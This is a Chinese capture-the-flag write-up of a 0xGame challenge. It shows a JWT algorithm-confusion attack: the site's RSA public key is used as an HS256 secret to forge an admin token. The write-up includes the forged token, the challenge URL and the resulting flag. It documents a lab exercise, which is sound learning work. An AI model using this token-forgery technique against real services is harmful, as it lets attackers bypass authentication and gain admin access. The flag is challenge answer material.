# 错位的签名

![](1.png)

用户名是 `guest` ，~~根据数据库经验~~知道测试用户的密码是 `guest123` 。

到处逛一逛：

![](2.png)

![](3.png)

![](4.png)

![](5.png)

这里给出了公钥：

```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA79XYBopfnVMKxI533oU2
VFQbEdSPtWRD+xSl73lHLVboGP1lSIZtnEj5AcTN2uDW6AYPiWL2iA3lEEsDTs7J
BUXyl6pysBPfrqC8n/MOXKaD4e8U5GAHFiwHWg2WzHlfFSlFkLjzp0vPkDK+fQ4C
lrd7shAyitB7use6DHcVCKuI4bFOoFbdI5sBGeyoD833g+ql9bRkH/vf8O+rPwHA
M+47r1iv3lY3ex0P45PRd7U7rq8P8UIw6qOI1tiYuKlFJmjFdcwtYG0dctxWwgL1
+7njrVQoWvuOTSsc9TDMhZkmmSsU3wXjaPxJpydck1C/w9ZLqsctKK5swYWhIcbc
BQIDAQAB
-----END PUBLIC KEY-----
```

提示页面说到：

> 漏洞和 JWT 有关。

这种就是跟着搜索引擎就可以倒腾出来一点头绪的线索。搜进 [JSON Web Tokens](https://www.jwt.io/) ：

![](6.png)

可以看到有一个用于 Encode 的区域。

![](7.png)

点进去就来到：

![](8.png)

hint 说：

> 如果一个系统既信公钥，又信 token 头里的 alg，会发生什么？

可以拿到 encode 过的 token 。

把 Payload 区域中的内容改成：

```json
{
    "key": "admin"
}
```

![](9.png)

因为这是题目给出来的。

然后就是把公钥复制进 Sign JWT 区域：

![](10.png)

右边就会吐出 token：

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJhZG1pbiJ9.8EpmITl1f-PdlStOLMQ0fn0vfU5avxMZNQybA9afVzY
```

![](11.png)

然后回到题供网页的《Flag 页面》，看到地址长这个样子：

```
http://9080-8f7247c4-875d-4232-80be-e6155f674999.challenge.ctfplus.cn/flag?jwt=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJndWVzdCIsInJvbGUiOiJndWVzdCIsInN1YiI6Imd1ZXN0IiwiZXhwIjoxNzkwNjc0Nzc3LCJuYmYiOjE3OTA2NzExMTd9.sDWbpS4RyE-hlsnqTr9TwL_Af2qOV5OV_5eX6qyJsznV7WziW-bOprewncKUr_Kgu6uvMc-hhRcJXcdFOY8fbEIFZ6YZmV25NdmxQCLp_c9IrlpXvGNW18gTYykKu3GxIahDmnMOAPhh0HfcYC_RRbyZ4f_0ARDOZHqYZHbrbYRm8jtC9n6la3093Xv4Pa5f-BFU-d0PXVu05gnSJjVUEwpaLWcm8XkQ1xY42wDsrkprCbSbeUIBzdPTIo1z2LTOW8nZeTP8i7mk9F_0GNiTkw24ZuywxM3587OiKAt_EKcvBv6SvUD_555zNLY0O8wPZRnhY7CyDWVZ5A-AXT8Qug
```

![](12.png)

格式是：

```
http://9080-8f7247c4-875d-4232-80be-e6155f674999.challenge.ctfplus.cn/flag?jwt=<JWT>
```

也就是说当前的 token 肯定是无权限的，要换成 [JSON Web Tokens](https://www.jwt.io/) encode 过的 token 。直接删掉旧 token ，新的粘贴上去访问就行了：

```
http://9080-8f7247c4-875d-4232-80be-e6155f674999.challenge.ctfplus.cn/flag?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJhZG1pbiJ9.8EpmITl1f-PdlStOLMQ0fn0vfU5avxMZNQybA9afVzY
```

![](13.png)

于是 flag 就是 `0xGame{ea59d8cb-c0f6-4834-b102-7bf600f876c6}` 。